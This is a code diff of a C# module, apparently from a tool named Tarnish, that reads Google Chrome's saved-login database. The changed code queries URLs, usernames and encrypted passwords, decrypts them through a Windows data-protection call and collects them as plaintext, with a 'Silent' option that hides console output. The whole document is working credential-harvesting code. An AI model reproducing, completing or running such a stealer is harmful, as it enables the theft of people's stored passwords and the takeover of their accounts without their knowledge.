@@ -1,12 +1,14 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Data.SQLite;
+using System.Text;
+using Community.CsharpSqlite;
 
 namespace Tarnish
 {
     class ProcChrome : Proc
     {
+        List<ChromeUserPassEntity> entities = new List<ChromeUserPassEntity>();
         public string GetPasswords()
         {
             try
@@ -15,34 +17,36 @@ namespace Tarnish
                 string FileOut = "";
                 if (File.Exists(DBPATH))
                 {
-                    string header = "Tarnish " + Global.assemName.Version.ToString();
-                    Global.WriteLine(header);
+                    string header = "Tarnish " + Global.AssemName.Version.ToString();
                     FileOut += header + Environment.NewLine;
-                    using (SQLiteConnection DB_Connection = new SQLiteConnection("Data Source=" + DBPATH + ";Version=3;"))
+                    Sqlite3.sqlite3 db = new Sqlite3.sqlite3();
+                    Sqlite3.sqlite3_open(DBPATH, ref db);
+                    Sqlite3.sqlite3_exec(db, "SELECT origin_url,username_value,password_value FROM LOGINS", new Sqlite3.dxCallback(The_Callback), 0, 0);
+                    foreach (ChromeUserPassEntity e in entities)
+                    try
                     {
-                        DB_Connection.Open();
-                        List<ChromeUserPassEntity> entities = new List<ChromeUserPassEntity>();
-                        using (SQLiteCommand cmd = DB_Connection.CreateCommand())
-                        {
-                            cmd.CommandText = "SELECT origin_url,username_value,password_value FROM LOGINS";
-                            SQLiteDataReader dr = cmd.ExecuteReader();
-                            if (dr.HasRows)
-                                while (dr.Read())
-                                    entities.Add(new ChromeUserPassEntity(dr.GetValue(0).ToString(), dr.GetValue(1).ToString(), (byte[])dr.GetValue(2)));
-                        }
-                        foreach (ChromeUserPassEntity e in entities)
+                        if (e.username_value != null && e.password_value != null && e.origin_url != null)
                             if (e.username_value.Trim().Length > 0)
                             {
-                                Global.WriteLine(e.origin_url);
+                                if (!Config.Silent)
+                                    Console.WriteLine(e.origin_url.PadLeft(e.origin_url.Length + 1, ' '));
                                 FileOut += e.origin_url + Environment.NewLine + "   " + e.username_value + Environment.NewLine + "   " + e.getPassword() + Environment.NewLine;
                             }
-                        DB_Connection.Close();
                     }
+                    catch (Exception ex) { Console.Write(ex.ToString()); }
+                    Sqlite3.sqlite3_close(db);
                     return FileOut;
                 }
             }
-            catch { }
+            catch (Exception ex) { Console.Write(ex.ToString()); }
             return "";
+        }
+        int The_Callback(object a_param, long argc, object argv, object column)
+        {
+            string[] argvs = (string[])argv;
+            byte[] pw = Encoding.Default.GetBytes(argvs[2]);
+            entities.Add(new ChromeUserPassEntity(argvs[0], argvs[1], pw));
+            return 0;
         }
         public string Name { get { return "Chrome"; } }
         class ChromeUserPassEntity
@@ -54,15 +58,11 @@ namespace Tarnish
             public string username_value { get { return _username_value; } set { _username_value = value; } }
             public byte[] password_value { get { return _password_value; } set { _password_value = value; } }
             public string getPassword()
-            {
-                byte[] output = Global.UnprotectData(_password_value, 1);
-                string toreturn = "";
-                for (int i = 0; i < output.Length; i++)
-                    toreturn += (char)output[i];
-                return toreturn;
-            }
+            { return Encoding.Default.GetString(Global.UnprotectData(_password_value, 1)); }
             public ChromeUserPassEntity(string url, string user, byte[] pass)
             { _origin_url = url; _username_value = user; _password_value = pass; }
+            public ChromeUserPassEntity(string url, string user, string pass)
+            { _origin_url = url; _username_value = user; _password_value = Encoding.ASCII.GetBytes(pass); }
         }
     }
 }
